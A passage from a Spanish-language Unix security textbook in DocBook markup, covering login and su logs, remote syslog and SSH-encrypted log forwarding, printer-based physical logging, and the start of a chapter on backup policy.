&#x00A0;andercheran:~#&#x00A0;last&#x00A0;-f&#x00A0;/var/adm/btmp&#x00A0;|head&#x00A0;-7
&#x00A0;pnvarro&#x00A0;&#x00A0;&#x00A0;ttyq1&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;term104.aiind.up&#x00A0;Wed&#x00A0;Feb&#x00A0;&#x00A0;9&#x00A0;16:27&#x00A0;-&#x00A0;15:38&#x00A0;&#x00A0;(23:11)
&#x00A0;jomonra&#x00A0;&#x00A0;&#x00A0;ttyq2&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;deportes.etsii.u&#x00A0;Fri&#x00A0;Feb&#x00A0;&#x00A0;4&#x00A0;14:27&#x00A0;-&#x00A0;09:37&#x00A0;(9+19:09)
&#x00A0;PNAVARRO&#x00A0;&#x00A0;ttyq4&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;term69.aiind.upv&#x00A0;Wed&#x00A0;Feb&#x00A0;&#x00A0;2&#x00A0;12:56&#x00A0;-&#x00A0;13:09&#x00A0;(20+00:12)
&#x00A0;panavarr&#x00A0;&#x00A0;ttyq2&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;term180.aiind.up&#x00A0;Fri&#x00A0;Jan&#x00A0;28&#x00A0;12:45&#x00A0;-&#x00A0;14:27&#x00A0;(7+01:42)
&#x00A0;vbarbera&#x00A0;&#x00A0;ttyp0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;daind03.etsii.up&#x00A0;Thu&#x00A0;Jan&#x00A0;27&#x00A0;20:17&#x00A0;&#x00A0;&#x00A0;still&#x00A0;logged&#x00A0;in
&#x00A0;pangel&#x00A0;&#x00A0;&#x00A0;&#x00A0;ttyq1&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;agarcia2.ter.upv&#x00A0;Thu&#x00A0;Jan&#x00A0;27&#x00A0;18:51&#x00A0;-&#x00A0;16:27&#x00A0;(12+21:36)
&#x00A0;abarra&#x00A0;&#x00A0;&#x00A0;&#x00A0;ttyp0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;dtra-51.ter.upv.&#x00A0;Thu&#x00A0;Jan&#x00A0;27&#x00A0;18:42&#x00A0;-&#x00A0;20:17&#x00A0;&#x00A0;(01:34)
&#x00A0;andercheran:~#
</literallayout>
<!--l. 582--><para>
  </para></section><!--end subsection--><!--l. 582--><section 
role="subsection"><title><abbrev role="title-mark">6.4.9</abbrev><anchor 
   id="x1-960006.4.9"  ></anchor>sulog</title>
<!--l. 583--><para>  Este es un &#xFB01;chero de texto donde se registran las ejecuciones de la orden su, indicando fecha, hora,
usuario que lanza el programa y usuario cuya identidad adopta, terminal asociada y &#x00E9;xito (&#x2018;+&#x2019;) o fracaso
(&#x2018;-&#x2019;) de la operaci&#x00F3;n:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;head&#x00A0;-4&#x00A0;/var/adm/sulog
&#x00A0;SU&#x00A0;12/27&#x00A0;07:41&#x00A0;+&#x00A0;console&#x00A0;root-toni
&#x00A0;SU&#x00A0;12/28&#x00A0;23:42&#x00A0;-&#x00A0;vt01&#x00A0;toni-root
&#x00A0;SU&#x00A0;12/28&#x00A0;23:43&#x00A0;+&#x00A0;vt01&#x00A0;toni-root
&#x00A0;SU&#x00A0;12/29&#x00A0;01:09&#x00A0;+&#x00A0;vt04&#x00A0;toni-root
&#x00A0;anita:/#
</literallayout>
<!--l. 597--><para>El registro de las invocaciones a la orden su puede estar deshabilitado por defecto en algunos sistemas Unix:
por ejemplo, en Solaris es necesario crear manualmente el &#xFB01;chero /var/adm/sulog, mientras que en
algunas distribuciones de Linux es necesario modi&#xFB01;car el archivo /etc/login.defs para habilitar el
registro de la actividad, tal y como veremos en el cap&#x02CA;&#x0131;tulo dedicado a este clon de Unix. De esta forma, al
instalar el sistema, y antes de pasarlo a un entorno de producci&#x00F3;n, quiz&#x00E1;s nos interese asegurarnos de que
estamos guardando todos los cambios de identidad que se producen en la m&#x00E1;quina a trav&#x00E9;s de
su.
  </para></section><!--end subsection--><!--l. 606--><section 
role="subsection"><title><abbrev role="title-mark">6.4.10</abbrev><anchor 
   id="x1-970006.4.10"  ></anchor>debug</title>
<!--l. 607--><para>  En este archivo de texto se registra informaci&#x00F3;n de depuraci&#x00F3;n (de debug) de los programas que se ejecutan
en la m&#x00E1;quina; esta informaci&#x00F3;n puede ser enviada por las propias aplicaciones o por el n&#x00FA;cleo del sistema
operativo:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;tail&#x00A0;-8&#x00A0;/var/adm/debug
&#x00A0;Dec&#x00A0;17&#x00A0;18:51:50&#x00A0;luisa&#x00A0;kernel:&#x00A0;ISO9660&#x00A0;Extensions:&#x00A0;RRIP&#x005F;1991A
&#x00A0;Dec&#x00A0;18&#x00A0;08:15:32&#x00A0;luisa&#x00A0;sshd[3951]:&#x00A0;debug:&#x00A0;sshd&#x00A0;version&#x00A0;1.2.21
&#x00A0;[i486-unknown-linux]
&#x00A0;Dec&#x00A0;18&#x00A0;08:15:32&#x00A0;luisa&#x00A0;sshd[3951]:&#x00A0;debug:&#x00A0;Initializing&#x00A0;random&#x00A0;number
&#x00A0;generator;&#x00A0;seed&#x00A0;file&#x00A0;/etc/ssh&#x005F;random&#x005F;seed
&#x00A0;Dec&#x00A0;18&#x00A0;08:15:32&#x00A0;luisa&#x00A0;sshd[3951]:&#x00A0;debug:&#x00A0;inetd&#x00A0;sockets&#x00A0;after&#x00A0;dupping:&#x00A0;7,&#x00A0;8
&#x00A0;Dec&#x00A0;18&#x00A0;08:15:34&#x00A0;luisa&#x00A0;sshd[3951]:&#x00A0;debug:&#x00A0;Client&#x00A0;protocol&#x00A0;version&#x00A0;1.5;&#x00A0;client
&#x00A0;software&#x00A0;version&#x00A0;1.2.21
&#x00A0;Dec&#x00A0;18&#x00A0;08:15:34&#x00A0;luisa&#x00A0;sshd[3951]:&#x00A0;debug:&#x00A0;Calling&#x00A0;cleanup&#x00A0;0x800cf90(0x0)
&#x00A0;Dec&#x00A0;18&#x00A0;16:33:59&#x00A0;luisa&#x00A0;kernel:&#x00A0;VFS:&#x00A0;Disk&#x00A0;change&#x00A0;detected&#x00A0;on&#x00A0;device&#x00A0;02:00
&#x00A0;Dec&#x00A0;18&#x00A0;23:41:12&#x00A0;luisa&#x00A0;identd[2268]:&#x00A0;Successful&#x00A0;lookup:&#x00A0;1593&#x00A0;,&#x00A0;22&#x00A0;:&#x00A0;toni.users
&#x00A0;luisa:~#
</literallayout>
<!--l. 628--><para>
  </para></section><!--end subsection--></section><!--end section--><!--l. 628--><section 
role="section"><title><abbrev role="title-mark">6.5</abbrev><anchor 
   id="x1-980006.5"  ></anchor>Logs remotos</title>
<!--l. 629--><para>  El demonio syslog permite f&#x00E1;cilmente guardar registros en m&#x00E1;quinas remotas; de esta forma se pretende
que, aunque la seguridad de un sistema se vea comprometida y sus logs sean modi&#xFB01;cados se puedan
seguir registrando las actividades sospechosas en una m&#x00E1;quina a priori segura. Esto se consigue
de&#xFB01;niendo un &#x2018;LOGHOST&#x2019; en lugar de un archivo normal en el &#xFB01;chero /etc/syslogd.conf de la
m&#x00E1;quina de la que nos interesa guardar informaci&#x00F3;n; por ejemplo, si queremos registrar toda la
informaci&#x00F3;n de prioridad info y notice en la m&#x00E1;quina remota rosita, lo indicaremos de la siguiente
forma:

     </para><literallayout role="verbatim">
&#x00A0;*.=info;*.=notice&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;@rosita
</literallayout>
<!--l. 643--><para>Tras modi&#xFB01;car /etc/syslogd.conf hacemos que el demonio relea su &#xFB01;chero de con&#xFB01;guraci&#x00F3;n envi&#x00E1;ndole la
se~nal SIGHUP (por ejemplo, con kill).
<!--br/-->
<!--br/-->Por su parte, en el host donde deseemos almacenar los logs, tenemos que tener de&#xFB01;nido el puerto syslog
en /etc/services y ejecutar syslogd con el par&#x00E1;metro &#x2018;-r&#x2019; para que acepte conexiones a trav&#x00E9;s de la
red:

     </para><literallayout role="verbatim">
&#x00A0;rosita:~#&#x00A0;grep&#x00A0;syslog&#x00A0;/etc/services
&#x00A0;syslog&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;514/udp
&#x00A0;rosita:~#&#x00A0;ps&#x00A0;xua|grep&#x00A0;syslogd
&#x00A0;root&#x00A0;&#x00A0;&#x00A0;41&#x00A0;&#x00A0;0.0&#x00A0;&#x00A0;0.4&#x00A0;&#x00A0;&#x00A0;852&#x00A0;&#x00A0;304&#x00A0;?&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;S&#x00A0;&#x00A0;&#x00A0;&#x00A0;Mar21&#x00A0;&#x00A0;&#x00A0;0:01&#x00A0;/usr/sbin/syslogd
&#x00A0;rosita:~#&#x00A0;kill&#x00A0;-TERM&#x00A0;41
&#x00A0;rosita:~#&#x00A0;syslogd&#x00A0;-r
&#x00A0;rosita:~#
</literallayout>
<!--l. 662--><para>A partir de ese momento todos los mensajes generados en la m&#x00E1;quina origen se enviar&#x00E1;n a la destino y se
registrar&#x00E1;n seg&#x00FA;n las reglas de esta, en un &#xFB01;chero (lo habitual), en un dispositivo&#x2026;o incluso se
reenviar&#x00E1;n a otra m&#x00E1;quina (en este caso hemos de tener cuidado con los bucles); si suponemos
que estas reglas, en nuestro caso, registran los mensajes de la prioridad especi&#xFB01;cada antes
en /var/adm/messages, en este archivo aparecer&#x00E1;n entradas de la m&#x00E1;quina que ha enviado la
informaci&#x00F3;n:

     </para><literallayout role="verbatim">
&#x00A0;rosita:~#&#x00A0;tail&#x00A0;-3&#x00A0;/var/adm/messages
&#x00A0;Mar&#x00A0;23&#x00A0;07:43:37&#x00A0;luisa&#x00A0;syslogd&#x00A0;1.3-3:&#x00A0;restart.
&#x00A0;Mar&#x00A0;23&#x00A0;07:43:46&#x00A0;luisa&#x00A0;in.telnetd[7509]:&#x00A0;connect&#x00A0;from&#x00A0;amparo
&#x00A0;Mar&#x00A0;23&#x00A0;07:57:44&#x00A0;luisa&#x00A0;--&#x00A0;MARK&#x00A0;--
&#x00A0;rosita:~#
</literallayout>
<!--l. 678--><para>Esto, que en muchas situaciones es muy recomendable, si no se realiza correctamente puede incluso
comprometer la seguridad de la m&#x00E1;quina que guarda registros en otro equipo: por defecto, el tr&#x00E1;&#xFB01;co se
realiza en texto claro, por lo que cualquier atacante con un sni&#xFB00;er entre las dos m&#x00E1;quinas puede tener
acceso a informaci&#x00F3;n importante que habr&#x02CA;&#x0131;a que mantener en secreto; imaginemos una situaci&#x00F3;n muy
habitual: un usuario que teclea su password cuando el sistema le pide el login. Evidentemente, esto generar&#x00E1;
un mensaje de error que syslogd registrar&#x00E1;; este mensaje ser&#x00E1; similar a este (Linux Slackware
4):

     </para><literallayout role="verbatim">
&#x00A0;Mar&#x00A0;23&#x00A0;05:56:56&#x00A0;luisa&#x00A0;login[6997]:&#x00A0;invalid&#x00A0;password&#x00A0;for&#x00A0;&#x2018;UNKNOWN&#x2019;&#x005C;
&#x00A0;on&#x00A0;&#x2018;ttyp5&#x2019;&#x00A0;from&#x00A0;&#x2018;amparo&#x2019;
</literallayout>
<!--l. 693--><para>Pero, &#x00BF;qu&#x00E9; suceder&#x02CA;&#x0131;a si en lugar de &#x2018;UNKNOWN&#x2019; el sistema almacenara el nombre de usuario que se ha
introducido, algo que hacen muchos clones de Unix? En esta situaci&#x00F3;n el mensaje ser&#x02CA;&#x0131;a muy parecido al
siguiente (Linux Red Hat 6.1):

     </para><literallayout role="verbatim">
&#x00A0;Mar&#x00A0;23&#x00A0;05:59:15&#x00A0;rosita&#x00A0;login[3582]:&#x00A0;FAILED&#x00A0;LOGIN&#x00A0;1&#x00A0;FROM&#x00A0;amparo&#x00A0;FOR&#x005C;
&#x00A0;5k4@b&#x0026;-,&#x00A0;User&#x00A0;not&#x00A0;known&#x00A0;to&#x00A0;the&#x00A0;underlying&#x00A0;authentication&#x00A0;module
</literallayout>
<!--l. 703--><para>Como podemos ver se registrar&#x02CA;&#x0131;a una contrase~na de usuario, contrase~na que estamos enviando a la m&#x00E1;quina
remota en texto claro a trav&#x00E9;s de la red; evidentemente, es un riesgo que no podemos correr. Quiz&#x00E1;s alguien
pueda pensar que una clave por s&#x02CA;&#x0131; sola no representa mucho peligro, ya que el atacante no conoce
el nombre de usuario en el sistema. De ninguna forma: el pirata s&#x00F3;lo tiene que esperar unos
instantes, porque cuando el usuario teclee su login y su password correctamente (en principio,
esto suceder&#x00E1; poco despu&#x00E9;s de equivocarse, recordemos que el usuario trata de acceder a su
cuenta) el sistema generar&#x00E1; un mensaje indicando que ese usuario (con su nombre) ha entrado al
sistema <anchor 
   id="x1-98001f1"  ></anchor><footnote><para>     Este comportamiento es con&#xFB01;gurable desde /etc/login.defs, como vemos en el cap&#x02CA;&#x0131;tulo dedicado a la seguridad en
Linux.</para></footnote>.
<!--br/-->
<!--br/-->Para evitar este problema existen dos aproximaciones: o bien registramos logs en un equipo directamente
conectado al nuestro, sin emitir tr&#x00E1;&#xFB01;co al resto de la red, o bien utilizamos comunicaciones
cifradas (por ejemplo con SSH) para enviar los registros a otro ordenador. En el primer caso s&#x00F3;lo
necesitamos un equipo con dos tarjetas de red, una por donde enviar el tr&#x00E1;&#xFB01;co hacia la red local y la
otra para conectar con la m&#x00E1;quina donde almacenamos los logs, que s&#x00F3;lo ser&#x00E1; accesible desde
nuestro equipo y que no ha de tener usuarios ni ofrecer servicios; no es necesaria una gran
potencia de c&#x00E1;lculo: podemos aprovechar un viejo 386 o 486 con Linux o FreeBSD para esta
tarea.
<!--br/-->
<!--br/-->El segundo caso, utilizar comunicaciones cifradas para guardar registros en otro equipo de la red, requiere
algo m&#x00E1;s de trabajo; aqu&#x02CA;&#x0131; no es estrictamente necesario que la m&#x00E1;quina est&#x00E9; aislada del resto de la red, ya que
la transferencia de informaci&#x00F3;n se va a realizar de forma cifrada, consiguiendo que un potencial atacante
no obtenga ning&#x00FA;n dato comprometedor analizando el tr&#x00E1;&#xFB01;co; evidentemente, aunque no est&#x00E9;
aislado, es fundamental que el sistema donde almacenamos los logs sea seguro. Para enviar un
log cifrado a una m&#x00E1;quina remota podemos utilizar, como hemos dicho antes, SSH unido a las
facilidades que ofrece syslogd; si lo hacemos as&#x02CA;&#x0131;, lo &#x00FA;nico que necesitamos es el servidor sshd
en la m&#x00E1;quina destino y el cliente ssh en la origen. Por ejemplo, imaginemos que queremos
utilizar a rosita para almacenar una copia de los registros generados en luisa conforme
se vayan produciendo; en este caso vamos a enviar logs a un &#xFB01;fo con nombre, desde donde
los cifraremos con SSH y los enviaremos al sistema remoto a trav&#x00E9;s de la red. Lo primero que
necesitamos hacer es crear un &#xFB01;chero de tipo tuber&#x02CA;&#x0131;a en la m&#x00E1;quina origen, por ejemplo con mknod o
mkfifo:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;mknod&#x00A0;/var/run/cifra&#x00A0;p
&#x00A0;luisa:~#&#x00A0;chmod&#x00A0;0&#x00A0;/var/run/cifra
&#x00A0;luisa:~#&#x00A0;ls&#x00A0;-l&#x00A0;/var/run/cifra
&#x00A0;p---------&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;May&#x00A0;&#x00A0;4&#x00A0;05:18&#x00A0;/var/run/cifra|
&#x00A0;luisa:~#
</literallayout>
<!--l. 753--><para>Este es el archivo al que enviaremos desde syslogd los registros que nos interesen, por ejemplo los
de prioridad warn; hemos de modi&#xFB01;car /etc/syslog.conf para a~nadirle una l&#x02CA;&#x0131;nea como la
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;tail&#x00A0;-1&#x00A0;/etc/syslog.conf
&#x00A0;*.warn&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;|/var/run/cifra
&#x00A0;luisa:~#
</literallayout>
<!--l. 763--><para>A continuaci&#x00F3;n haremos que syslog relea su nueva con&#xFB01;guraci&#x00F3;n mediante la se~nal SIGHUP:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;ps&#x00A0;xua|grep&#x00A0;syslog&#x00A0;|grep&#x00A0;-v&#x00A0;grep
&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;7978&#x00A0;&#x00A0;0.0&#x00A0;&#x00A0;0.2&#x00A0;&#x00A0;1372&#x00A0;&#x00A0;156&#x00A0;?&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;S&#x00A0;&#x00A0;&#x00A0;&#x00A0;03:01&#x00A0;&#x00A0;&#x00A0;0:00&#x00A0;syslogd&#x00A0;-m&#x00A0;0
&#x00A0;luisa:~#&#x00A0;kill&#x00A0;-HUP&#x00A0;7978
&#x00A0;luisa:~#
</literallayout>
<!--l. 773--><para>Una vez realizados estos pasos ya conseguimos que se registren los eventos que nos interesan en el &#xFB01;chero
/var/run/cifra; este archivo es una tuber&#x02CA;&#x0131;a con nombre, de forma que los datos que le enviamos no se
graban en el disco realmente, sino que s&#x00F3;lo esperan a que un proceso lector los recoja. Ese proceso lector ser&#x00E1;
justamente el cliente ssh, encargado de cifrarlos y enviarlos al sistema remoto; para ello debemos lanzar
una orden como:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;cat&#x00A0;/var/run/cifra&#x00A0;|&#x00A0;ssh&#x00A0;-x&#x00A0;rosita&#x00A0;&#x2019;cat&#x00A0;&#x003E;&#x003E;/var/log/luisa&#x2019;
</literallayout>
<!--l. 785--><para>Si tenemos con&#xFB01;gurado SSH para que autentique sin clave podemos lanzar el proceso directamente en
background; si tenemos que introducir la clave del root, una vez tecleada podemos parar el proceso y
relanzarlo tambi&#x00E9;n en segundo plano (esto es simplemente por comodidad, realmente no es
necesario). Lo &#x00FA;nico que estamos haciendo con este mecanismo es cifrar lo que llega al &#xFB01;fo y
enviarlo de esta forma al sistema remoto, en el que se descifrar&#x00E1; y se guardar&#x00E1; en el &#xFB01;chero
/var/log/luisa.
<!--br/-->
<!--br/-->Quiz&#x00E1;s nos interese a~nadir unas l&#x02CA;&#x0131;neas en los scripts de arranque de nuestra m&#x00E1;quina para que este
proceso se lance autom&#x00E1;ticamente al iniciar el sistema; si lo hacemos as&#x02CA;&#x0131; hemos de tener cuidado
con la autenticaci&#x00F3;n, ya que si ssh requiere una clave para conectar con el sistema remoto
es probable que la m&#x00E1;quina tarde m&#x00E1;s de lo normal en arrancar si un operador no est&#x00E1; en la
consola: justamente el tiempo necesario hasta que ssh produzca un timeout por no teclear
el password de root en el sistema remoto. Si al producirse el timeout el programa ssh no
devuelve el control al shell, el sistema ni siquiera arrancar&#x00E1;; de cualquier forma, si ese timeout
se produce no estaremos registrando ning&#x00FA;n evento en la otra m&#x00E1;quina. Por supuesto, tambi&#x00E9;n
debemos prestar atenci&#x00F3;n a otros problemas con la m&#x00E1;quina destino que eviten que la conexi&#x00F3;n se
produzca, con un n&#x00FA;mero m&#x00E1;ximo de usuarios sobrepasado o simplemente que ese sistema est&#x00E9;
apagado.
  </para></section><!--end section--><!--l. 807--><section 
role="section"><title><abbrev role="title-mark">6.6</abbrev><anchor 
   id="x1-990006.6"  ></anchor>Registros f&#x02CA;&#x0131;sicos</title>
<!--l. 808--><para>  Para asegurarnos m&#x00E1;s de que la informaci&#x00F3;n que se registra de las actividades en nuestro sistema es &#xFB01;able
acabamos de explicar c&#x00F3;mo almacenarla, a la vez que en un &#xFB01;chero de la propia m&#x00E1;quina, en un
equipo remoto a trav&#x00E9;s de la red; la idea es poder comparar los registros de ambos sistemas
para detectar posibles modi&#xFB01;caciones en una de ellas. Pero, &#x00BF;qu&#x00E9; sucede si el atacante consigue
tambi&#x00E9;n control sobre el segundo equipo, y modi&#xFB01;ca tambi&#x00E9;n ah&#x02CA;&#x0131; los &#xFB01;cheros de log? Aunque a
priori este sea un sistema seguro, sabemos que nadie nos puede garantizar la seguridad al
100 %; en algunos casos (por ejemplo si sospechamos que el intruso ha conseguido el control de
ambos equipos) es conveniente recurrir a registros f&#x02CA;&#x0131;sicos, mucho m&#x00E1;s dif&#x02CA;&#x0131;ciles de alterar que los
l&#x00F3;gicos.
<!--br/-->
<!--br/-->No siempre se guarda informaci&#x00F3;n en un &#xFB01;chero plano, ya sea local o remoto. Unix permite almacenar
mensajes en &#xFB01;cheros especiales &#x2013; dispositivos &#x2013;, como terminales o impresoras; son estas &#x00FA;ltimas las m&#x00E1;s
habituales por la seguridad que ofrecen, ya que mientras que un intruso con el privilegio su&#xFB01;ciente puede
modi&#xFB01;car un &#xFB01;chero de log local, o acceder a un sistema donde se almacenen registros remotos, no puede
eliminar una informaci&#x00F3;n extra&#x02CA;&#x0131;da por impresora sin tener acceso f&#x02CA;&#x0131;sico a la misma. El demonio syslog de
cualquier sistema Unix permite especi&#xFB01;car uno de estos &#xFB01;cheros especiales como destinatario de ciertos
registros de una forma muy simple: no tenemos m&#x00E1;s que a~nadir una entrada en /etc/syslog.conf
indicando el dispositivo y la clase de eventos a registrar en &#x00E9;l; por ejemplo, para enviar todos los mensajes
de prioridad warn a una impresora (como /dev/lp1) no tenemos m&#x00E1;s que a~nadir en el archivo la l&#x02CA;&#x0131;nea
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;*.warn&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/dev/lp1
</literallayout>
<!--l. 840--><para>Como siempre, tras modi&#xFB01;car el &#xFB01;chero de con&#xFB01;guraci&#x00F3;n hemos de hacer que el demonio lo relea, bien
envi&#x00E1;ndole la se~nal SIGHUP o bien deteni&#x00E9;ndolo y volvi&#x00E9;ndolo a lanzar; por &#x00FA;ltimo, si decidimos utilizar una
impresora para generar registros f&#x02CA;&#x0131;sicos hemos de intentar que se trate de un modelo de agujas, ya que
dispositivos m&#x00E1;s modernos utilizan bu&#xFB00;ers que no se llegan a imprimir hasta que est&#x00E1;n llenos, por lo que
ser&#x02CA;&#x0131;a posible para un atacante hacer que se pierda cierta informaci&#x00F3;n. Hemos de evitar especialmente
algunos modelos nuevos de impresoras que tienen incluso sistema de red y direcci&#x00F3;n IP para control remoto,
ya que en este caso puede suceder que un pirata llegue a controlar el dispositivo igual que controla la
m&#x00E1;quina que env&#x02CA;&#x0131;a los registros.
<!--br/-->
<!--br/-->Otro tipo de registro f&#x02CA;&#x0131;sico, m&#x00E1;s b&#x00E1;sico e incluso m&#x00E1;s &#xFB01;able que el anterior, pero que por desgracia no se suele
utilizar mucho, son las propias anotaciones sobre la marcha del sistema que todo administrador deber&#x02CA;&#x0131;a
realizar en una especie de &#x2018;cuaderno de bit&#x00E1;cora&#x2019; de cada equipo. Evidentemente la &#x00FA;nica persona con
acceso a dicho cuaderno deber&#x02CA;&#x0131;a ser el administrador, y deber&#x02CA;&#x0131;a guardarse en un lugar seguro,
aplicando las mismas pol&#x02CA;&#x0131;ticas que por ejemplo aplicamos a las cintas de backup (alejadas
del entorno de operaciones para prevenir la p&#x00E9;rdida ante un desastre f&#x02CA;&#x0131;sico, almacenadas bajo
llave&#x2026;).



</para><!--l. 1--><para>

  </para></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-1000007"  ></anchor>Copias de seguridad</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">7.1</abbrev><anchor 
   id="x1-1010007.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  Las copias de seguridad del sistema son con frecuencia el &#x00FA;nico mecanismo de recuperaci&#x00F3;n que poseen los
administradores para restaurar una m&#x00E1;quina que por cualquier motivo &#x2013; no siempre se ha de tratar de un
pirata que borra los discos &#x2013; ha perdido datos. Por tanto, una correcta pol&#x02CA;&#x0131;tica para realizar, almacenar y,
en caso de ser necesario, restaurar los backups es vital en la plani&#xFB01;caci&#x00F3;n de seguridad de todo
sistema.
<!--br/-->
<!--br/-->Asociados a los backups suelen existir unos problemas de seguridad t&#x02CA;&#x0131;picos en muchas organizaciones. Por
ejemplo, uno de estos problemas es la no veri&#xFB01;caci&#x00F3;n de las copias realizadas: el administrador ha dise~nado
una pol&#x02CA;&#x0131;tica de copias de seguridad correcta, incluso exhaustiva en muchas ocasiones, pero nadie se
encarga de veri&#xFB01;car estas copias&#x2026;hasta que es necesario restaurar &#xFB01;cheros de ellas. Evidentemente, cuando
llega ese momento el responsable del sistema se encuentra ante un gran problema, problema que se podr&#x02CA;&#x0131;a
haber evitado simplemente teniendo la precauci&#x00F3;n de veri&#xFB01;car el correcto funcionamiento de los backups;
por supuesto, restaurar una copia completa para comprobar que todo es correcto puede ser demasiado
trabajo para los m&#x00E9;todos habituales de operaci&#x00F3;n, por lo que lo que se suele hacer es tratar de recuperar
varios &#xFB01;cheros aleatorios del backup, asumiendo que si esta recuperaci&#x00F3;n funciona, toda la copia es
correcta.
<!--br/-->
<!--br/-->Otro problema cl&#x00E1;sico de las copias de seguridad es la pol&#x02CA;&#x0131;tica de etiquetado a seguir. Son pocos los
administradores que no etiquetan los dispositivos de backup, algo que evidentemente no es muy &#x00FA;til: si llega
el momento de recuperar &#xFB01;cheros, el operador ha de ir cinta por cinta (o disco por disco, o CD-ROM por
CD-ROM&#x2026;) tratando de averiguar d&#x00F3;nde se encuentran las &#x00FA;ltimas versiones de tales archivos. No obstante,
muchos administradores siguen una pol&#x02CA;&#x0131;tica de etiquetado exhaustiva, proporcionando todo tipo de
detalles sobre el contenido exacto de cada medio; esto, que en principio puede parecer una posici&#x00F3;n
correcta, no lo es tanto: si por cualquier motivo un atacante consigue sustraer una cinta, no tiene que
investigar mucho para conocer su contenido exacto, lo que le proporciona acceso a informaci&#x00F3;n muy
concreta (y muy valiosa) de nuestros sistemas sin ni siquiera penetrar en ellos. La pol&#x02CA;&#x0131;tica
correcta para etiquetar los backups ha de ser tal que un administrador pueda conocer la situaci&#x00F3;n
exacta de cada &#xFB01;chero, pero que no suceda lo mismo con un atacante que roba el medio de
almacenamiento; esto se consigue, por ejemplo, con c&#x00F3;digos impresos en cada etiqueta, c&#x00F3;digos cuyo
signi&#xFB01;cado sea conocido por los operadores de copias de seguridad pero no por un potencial
atacante.
<!--br/-->
<!--br/-->La ubicaci&#x00F3;n &#xFB01;nal de las copias de seguridad tambi&#x00E9;n suele ser err&#x00F3;nea en muchos entornos; generalmente, los
operadores tienden a almacenar los backups muy cerca de los sistemas, cuando no en la misma sala. Esto,
que se realiza para una mayor comodidad de los t&#x00E9;cnicos y para recuperar &#xFB01;cheros f&#x00E1;cilmente, es un grave
error: no hay m&#x00E1;s que imaginar cualquier desastre del entorno, como un incendio o una inundaci&#x00F3;n, para
hacerse una idea de lo que les suceder&#x02CA;&#x0131;a a los backups en esos casos. Evidentemente, se destruir&#x02CA;&#x0131;an
junto a los sistemas, por lo que nuestra organizaci&#x00F3;n perder&#x02CA;&#x0131;a toda su informaci&#x00F3;n; no obstante,
existen voces que reivindican como correcto el almacenaje de las copias de seguridad junto a los
propios equipos, ya que as&#x02CA;&#x0131; se consigue centralizar un poco la seguridad (protegiendo una
&#x00FA;nica estancia se salvaguarda tanto las m&#x00E1;quinas como las copias). Lo habitual en cualquier
organizaci&#x00F3;n suele ser un t&#x00E9;rmino medio entre ambas aproximaciones: por ejemplo, podemos tener un
juego de copias de seguridad completas en un lugar diferente a la sala de operaciones, pero
protegido y aislado como esta, y un juego para uso diario en la propia sala, de forma que los
operadores tengan f&#x00E1;cil la tarea de recuperar &#xFB01;cheros; tambi&#x00E9;n podemos utilizar armarios ign&#x02CA;&#x0131;fugos
que requieran de ciertas combinaciones para su apertura (combinaciones que s&#x00F3;lo determinado
personal ha de conocer), si decidimos almacenar todos los backups en la misma estancia que los
equipos.
<!--br/-->
